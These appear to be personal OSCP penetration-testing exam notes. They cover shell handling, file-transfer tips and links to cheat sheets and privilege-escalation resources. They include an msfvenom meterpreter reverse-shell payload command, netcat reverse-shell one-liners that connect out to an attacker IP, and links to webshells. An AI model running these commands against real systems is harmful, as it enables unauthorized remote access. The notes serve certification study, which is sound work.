# OSCP Notes

### Session Passing

* If you have a shell via Netcat on a Windows machine, try using Curl to download a  ps1 to the target and executing it.
  * `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh -o meterpreter-64.ps1`

### Shells

These are the most consistent webshells that I have discovered throughout testing:&#x20;

* [Aspnet](https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx)&#x20;
* [PHP](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

`nc 10.10.10.1 4444 –e /bin/bash`

`nc.exe 10.10.10.1 4444 –e cmd.exe`

### Shell Upgrades

[This is a great guide on upgrading to a TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

`python -c 'import pty; pty.spawn("/bin/bash")'`

Best TTY upgrade:

1. Background your shell with `CTRL + Z` or `CMD + Z`

### General Tips and Tricks

* Transferring a file such as a .doc to a FTP share? Reminder to use `binary` before doing so or else it will upload as ASCII.&#x20;
* When enumerating FTP, ensure you run `dir -a` to enumerate any hidden files or directories on the system. You may find l00t!
* Metasploit and Meterpreter are only allowed against one machine in the exam so ensure that you are sure before executing. There may be other ways to accomplish what you want (e.g., CrackMapExec, Lsassy, etc).&#x20;
* If `ifconfig` and `ip addr` are not working to get the IP address of a machine for a screenshot you can utilize `/sbin/ifconfig`

### Helpful Blogs

* [List of Kerberos attacks with different tooling](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
* [From MSSQL to RCE](https://bhavsec.com/posts/mssql-rce/)

### Helpful OSCP Cheatsheets

* [OSCP Enumeration Cheatsheet](https://strongcourage.github.io/2020/05/03/enum.html)
* [iRedTeam Cheatsheet](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
* [Impacket Cheatsheet](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
* [Amazing GitBook Reference](https://gitbook.brainyou.stream/basic-windows/tcm-win-privesc)
* [Privilege Escalation (Great resource)](https://oscp.securable.nl/privilege-escalation)

### References While Building my Notes

* [FareedFauzi's Notes](https://fareedfauzi.gitbook.io/oscp-notes/others/active-directory-attack)
* [Rotten Potato Blog](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
* [Pass the Hash with Machine Accounts](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-hash-with-machine-accounts)
